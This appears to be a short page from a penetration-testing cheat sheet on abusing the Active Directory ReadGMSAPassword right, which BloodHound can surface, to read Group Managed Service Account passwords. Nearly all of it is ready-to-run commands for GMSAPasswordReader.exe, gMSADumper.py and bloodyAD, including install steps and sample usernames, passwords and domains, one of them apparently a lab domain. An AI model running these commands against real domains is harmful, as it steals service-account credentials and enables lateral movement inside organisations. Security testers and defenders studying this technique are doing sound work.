---
description: >-
  If you have a read permission, you can decrypt Group Managed Services Account
  (gMSA) password.
---

# gMSA account

[https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword)

In Bloodhound, you see ReadGMSAPassword in 'First Degree Object Control' in a Group or User like below.&#x20;

<figure><img src="../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
# Windows
# Download the GMSAPasswordReader.exe from the site below. 
# https://github.com/expl0itabl3/Toolies

.\GMSAPasswordReader.exe --AccountName 'svc_apache'

# Linux 
gMSADumper.py -u 'enox' -p 'california' -d 'domain.local'

# bloodAD
git clone https://github.com/CravateRouge/bloodyAD
pipenv shell
cd bloodyAD
pip3 install .

bloodyAD/bloodyAD.py -u tbrady -d rebound.htb -p 543BOMBOMBUNmanda --host $RHOST get object 'delegator$' --attr msDS-ManagedPassword
```
{% endcode %}
